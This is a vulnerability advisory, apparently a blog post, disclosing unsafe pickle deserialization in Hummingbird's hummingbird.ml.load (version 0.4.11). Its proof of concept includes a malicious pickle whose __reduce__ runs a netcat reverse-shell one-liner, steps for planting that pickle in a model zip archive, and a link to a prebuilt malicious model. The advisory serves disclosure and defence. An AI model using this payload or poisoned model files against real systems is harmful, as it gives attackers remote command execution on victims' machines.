---
layout: post
title:  "Command injection via unsafe pickle.loads in hummingbird.ml.load in hummingbird"
date:  2024-06-24 10:31:06 +0800
categories: command-injection
---

## Name

> Command injection via unsafe pickle.loads using api hummingbird.ml.load

## Weakness

> CWE-94: Code Injection

## Severity

> High (8.8)

## Version

> 0.4.11

## Description

Hummingbird can be used to convert trained traditional ML models into [PyTorch, TorchScript, ONNX, and TVM](https://github.com/microsoft/hummingbird?tab=readme-ov-file#introduction). In Hummingbird [official example](https://github.com/microsoft/hummingbird?tab=readme-ov-file#examples), it trains a scikit-learn RandomForestClassifier model, save the model to a zip file, and finally load the model back from the zip file.

```
import numpy as np
from sklearn.ensemble import RandomForestClassifier
from hummingbird.ml import convert, load

# Create some random data for binary classification
num_classes = 2
X = np.random.rand(100000, 28)
y = np.random.randint(num_classes, size=100000)

# Create and train a model (scikit-learn RandomForestClassifier in this case)
skl_model = RandomForestClassifier(n_estimators=10, max_depth=10)
skl_model.fit(X, y)

# Use Hummingbird to convert the model to PyTorch
model = convert(skl_model, 'pytorch')

# Run predictions on CPU
model.predict(X)

# Run predictions on GPU
model.to('cuda')
model.predict(X)

# Save the model
model.save('hb_model')

# Load the model back
model = load('hb_model')
```

After running the example snippets, it creates a `hb_model.zip` file containing all PyTorch model information. The structure of zipped model file:

```
hb_model.zip
    |___deploy_model.zip (pickle format)
    |___model_configuration.txt
    |___model_type.txt
```

When loading the model back, it uses [`PyTorchSklearnContainer.load`](https://github.com/microsoft/hummingbird/blob/d489151e97eaa9d8ec446118b709863a5acab87d/hummingbird/ml/containers/sklearn/pytorch_containers.py#L108) to extract the zip file, and use [`pickle.load`](https://github.com/microsoft/hummingbird/blob/d489151e97eaa9d8ec446118b709863a5acab87d/hummingbird/ml/containers/sklearn/pytorch_containers.py#L177) to load the `deploy_model.zip` which is a pickle file.

The vulnerable function: [`PyTorchSklearnContainer.load#L177`](https://github.com/microsoft/hummingbird/blob/d489151e97eaa9d8ec446118b709863a5acab87d/hummingbird/ml/containers/sklearn/pytorch_containers.py#L177)

```
@staticmethod
def load(location, do_unzip_and_model_type_check=True, delete_unzip_location_folder: bool = True,
            digest=None, override_flag=False):
    ...
    # Unzip the dir.
    if do_unzip_and_model_type_check:
        zip_location = location
        if not location.endswith("zip"):
            zip_location = location + ".zip"
        else:
            location = zip_location[:-4]
        assert os.path.exists(zip_location), "Zip file {} does not exist.".format(zip_location)
    ...

    if model_type == "torch.jit":
        # This is a torch.jit model
        model = torch.jit.load(os.path.join(location, constants.SAVE_LOAD_TORCH_JIT_PATH))
        with open(os.path.join(location, "container.pkl"), "rb") as file:
            # vulnerable to command injection !!!
            container = pickle.load(file)
        container._model = model
    elif model_type == "torch":
        # This is a pytorch  model
        with open(os.path.join(location, constants.SAVE_LOAD_TORCH_JIT_PATH), "rb") as file:
            # vulnerable to command injection !!!
            container = pickle.load(file)
    ...
    return container
```

## Proof of Concept

Firstly, install latest hummingbird 

```
pip install hummingbird-ml
```

And create a valid pytorch model file following [official example](https://github.com/microsoft/hummingbird?tab=readme-ov-file#examples):

```
import numpy as np
from sklearn.ensemble import RandomForestClassifier
from hummingbird.ml import convert, load

# Create some random data for binary classification
num_classes = 2
X = np.random.rand(100000, 28)
y = np.random.randint(num_classes, size=100000)

# Create and train a model (scikit-learn RandomForestClassifier in this case)
skl_model = RandomForestClassifier(n_estimators=10, max_depth=10)
skl_model.fit(X, y)

# Use Hummingbird to convert the model to PyTorch
model = convert(skl_model, 'pytorch')

# Run predictions on CPU
model.predict(X)

# Run predictions on GPU
model.to('cuda')
model.predict(X)

# Save the model
model.save('hb_model')
```

Now we have a valid pytorch model file in zip format:

```
hb_model.zip
    |___deploy_model.zip (pickle format)
    |___model_configuration.txt
    |___model_type.txt
```

Create a malicious pickle file named `deploy_model.zip` 

```
import pickle
import os

class RCE:
    def __reduce__(self):
        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | '
               '/bin/sh -i 2>&1 | nc 127.0.0.1 1234 > /tmp/f')
        return os.system, (cmd,)

with open('deploy_model.zip', 'wb') as f:
    pickle.dump(RCE(), f)
```

Use following command to replace and update the `deploy_model.zip` file in `hb_model.zip`:

```
zip -u hb_model.zip deploy_model.zip
```

Now we have a malicious pytorch model file `hb_model.zip`, you can download from [github](https://raw.githubusercontent.com/sunriseXu/onnx/main/hb_model.zip).


### Start attack

Use following snippets to load the model back, it will trigger the unsafe `pickle.loads` command injection:

```
from hummingbird.ml import load
load("hb_model", override_flag=True)
```

After the command executed, we can check the `/tmp/f` file is created.

```
> ls -la /tmp/f
prw-r--r-- 1 kali kali 0 Jun 24 19:48 /tmp/f
```

### Colab

Tested on google colab: [https://colab.research.google.com/drive/1vr8BG1rQhJf7qLFoXLZLOCKxFYnqsuY2?usp=sharing](https://colab.research.google.com/drive/1vr8BG1rQhJf7qLFoXLZLOCKxFYnqsuY2?usp=sharing)

![image](http://live.staticflickr.com/65535/53823382430_a03098fdc4_k.jpg)

## Impact

This vulnerability can have severe consequences. If victims load a malicious pytorch model using `hummingbird.ml.load`, command injection can be achieved on victims' mechine.


## Occurrences

[PyTorchSklearnContainer.load#L172](https://github.com/microsoft/hummingbird/blob/d489151e97eaa9d8ec446118b709863a5acab87d/hummingbird/ml/containers/sklearn/pytorch_containers.py#L172)

[PyTorchSklearnContainer.load#L177](https://github.com/microsoft/hummingbird/blob/d489151e97eaa9d8ec446118b709863a5acab87d/hummingbird/ml/containers/sklearn/pytorch_containers.py#L177)

